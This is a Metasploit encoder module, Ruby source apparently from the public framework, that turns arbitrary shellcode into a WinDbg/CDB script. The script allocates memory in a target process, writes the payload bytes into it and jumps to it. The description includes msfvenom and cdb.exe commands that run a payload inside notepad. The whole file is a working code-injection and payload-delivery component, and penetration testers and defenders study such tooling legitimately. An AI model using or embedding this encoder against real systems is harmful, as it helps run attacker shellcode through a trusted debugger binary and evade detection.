##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Encoder
  Rank = ManualRanking

  def initialize
    super(
      'Name'             => 'Windbg Shellcode Encoder',
      'Description'      => %q{
        Encodes the shellcode as a windbg script. Original idea from http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html
        The following example will pop calc from a notepad process:
        ./msfvenom  -p windows/x64/exec -e generic/windbg EXITFUNC=thread CMD=calc.exe > calc.wds
        cdb.exe -cf calc.wds -o notepad.exe
      },
      'Author'           => 'Caleb Anderson',
      'Arch'             => [ ARCH_X86, ARCH_X86_64 ],
      'Platform'         => 'win',
      'License'          => BSD_LICENSE,
      'EncoderType'      => Msf::Encoder::Type::Raw)
  end


  #
  # Encodes the payload
  #
  def encode_block(state, buf)
    i = 0
    bytes = buf.unpack('C*')
    res = ""
    res << ".foreach /pS 5  ( register { .dvalloc #{bytes.length} } ) { r @$t0 = register }\n "
    
    
    bytes.each do |byte|
	res << ";eb @$t0+#{"%04x" % i} #{"%02x" % byte}"
	i += 1
	res << "\n" if (i % 4) == 0
    end 
    
    res << "\n"
    res << "r @$ip=@$t0\n"
    res << "g\ng\ng\n"
    res
  end
end
